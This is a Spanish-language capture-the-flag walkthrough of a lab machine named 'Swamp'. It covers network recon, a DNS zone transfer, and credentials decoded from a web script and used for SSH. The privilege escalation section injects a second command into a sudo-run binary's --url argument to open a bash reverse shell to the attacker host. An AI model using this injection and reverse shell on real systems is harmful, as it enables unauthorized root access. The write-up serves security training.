---
description: 'Difficulty: Easy'
---

# Swamp

### Recon

1. Empezamos haciendo un reconocimiento de red para identificar el host de la máquina víctima:

```bash
sudo nmap -sn 192.168.56.0/24
```

<figure><img src="../../../.gitbook/assets/image (501).png" alt=""><figcaption></figcaption></figure>

*   Host identificados:

    * 192.168.56.1
    * 192.168.56.100
    * 192.168.56.102 (objetivo)
    * 192.168.56.101 (nuestra Kali atacante)



2. Le realizamos un escaneo con nmap:

```bash
sudo nmap -sCV -p- --open -T5 192.168.56.102
```

* Desglose del comando:
  * -sC: Ejecuta los scripts por defecto de nmap (NSE, Nmap Scripting Engine), orientados a información básica y detección de vulnerabilidades comunes.
  * -sV: Detecta la versión de los servicios que corren en los puertos abiertos.
  * -p-: Escanea todos los puertos TCP posibles (del 1 al 65535), no solo los más comunes.
  * \--open: Muestra únicamente los puertos que están abiertos, ocultando los cerrados/filtrados.
  * -T5: Usa la “máxima velocidad” en el escaneo, reduciendo los tiempos de espera entre pruebas. Es el nivel más agresivo y puede generar más tráfico en la red.

<figure><img src="../../../.gitbook/assets/image (502).png" alt=""><figcaption></figcaption></figure>

* Puertos identificados:
  * 22/tcp
  * 53/tcp
  * 80/tcp

3. El puerto 80 abierto nos indica que hay un sitio web, hay un redirect hacia el dominio swamp.nyx. Lo añadiremos al archivo /etc/hosts de nuestra máquina atacante:

<figure><img src="../../../.gitbook/assets/image (503).png" alt=""><figcaption></figcaption></figure>

4. Comprobamos accediendo desde el navegador de la máquina atacante:

<figure><img src="../../../.gitbook/assets/image (504).png" alt=""><figcaption></figcaption></figure>

### DNS Zone Transfer

1. Con este tipo de ataque vamos a intentar obtener información del dominio DNS (por ejemplo, subdominios)

```bash
dig axfr swamp.nyx @192.168.56.102
```

<figure><img src="../../../.gitbook/assets/image (505).png" alt=""><figcaption></figcaption></figure>

2. Descubrimos múltiples subdominios, los añadiremos al archivo /etc/hosts:

<figure><img src="../../../.gitbook/assets/image (506).png" alt=""><figcaption></figcaption></figure>

* Vemos que los subdominios hacen referencia a la película de Shrek (la ciénaga, el asno, fiona, etc). Podemos entrar en los subdominios añadidos.

3. Visitamos farfaraway.swamp.nyx desde el navegador:

<figure><img src="../../../.gitbook/assets/image (507).png" alt=""><figcaption></figcaption></figure>

4. Inspeccionamos el código fuente de la página y vemos que se importa el archivo script.js:

<figure><img src="../../../.gitbook/assets/image (508).png" alt=""><figcaption></figcaption></figure>

5. Analizamos el código del archivo en el Debugger y localizamos el siguiente string codificado:

<figure><img src="../../../.gitbook/assets/image (509).png" alt=""><figcaption></figcaption></figure>

6. Parece estar codificado en base64, vamos a hacer un decode:

```bash
base64 -d <<< 'c2hyZWs6cHV0b3Blc2FvZWxhc25v' ;echo
```

<figure><img src="../../../.gitbook/assets/image (510).png" alt=""><figcaption></figcaption></figure>

* Obtenemos las credenciales shrek:putopesaoelasno

7. Anteriormente, hemos identificado que el puerto 22/tcp está abierto, es el puerto que se utiliza para el servicio SSH, vamos a intentar acceder con las credenciales que hemos obtenido.

```bash
ssh shrek@192.168.56.102
putopesaoelasno
```

<figure><img src="../../../.gitbook/assets/image (511).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (512).png" alt=""><figcaption></figcaption></figure>

### Privilege Escalation

1. Hemos obtenido acceso con el usuario shrek al sistema objetivo, vamos a probar si podemos ejecutar como root.

<figure><img src="../../../.gitbook/assets/image (513).png" alt=""><figcaption></figcaption></figure>

* Se identifica que se puede ejecutar el binario header\_checker.

2. Revisamos que necesita header\_checker para ejecutarse:

<figure><img src="../../../.gitbook/assets/image (514).png" alt=""><figcaption></figcaption></figure>

3. Probaremos a ver que es lo que hace header\_checker:

<figure><img src="../../../.gitbook/assets/image (515).png" alt=""><figcaption></figcaption></figure>

* Lo que está haciendo header\_checker es un curl.

4. Probaremos a inyectar un comando justo después de utilizar el binario para ver si se ejecuta:

<figure><img src="../../../.gitbook/assets/image (516).png" alt=""><figcaption></figcaption></figure>

* Ejecutamos el comando como root, por lo que podríamos inyectar comandos que se ejecuten como root en el sistema objetivo.

5. Ponemos otra consola en nuestra máquina atacante a la escucha:

```bash
nc -lvnp 4444
```

<figure><img src="../../../.gitbook/assets/image (517).png" alt=""><figcaption></figcaption></figure>

6. Desde el terminal con la sesión SSH shrek@swamp ejecutamos el comando para recibir la conexión en la máquina atacante:

```bash
sudo /home/shrek/header_checker --url "google.es; bash -c \"bash -i >& /dev/tcp/192.168.56.101/4444 0>&1\""
```

<figure><img src="../../../.gitbook/assets/image (518).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (519).png" alt=""><figcaption></figcaption></figure>

7. Podemos ejecutar comandos en el sistema objetivo:

<figure><img src="../../../.gitbook/assets/image (520).png" alt=""><figcaption></figcaption></figure>

* Mostramos el contenido de **user.txt** que es una de las flags.

8. Buscamos y mostramos la flag **root.txt** que sería la otra que nos quedaría:

```bash
find / -name root.txt 2>/dev/null |xargs cat
```

<figure><img src="../../../.gitbook/assets/image (521).png" alt=""><figcaption></figcaption></figure>
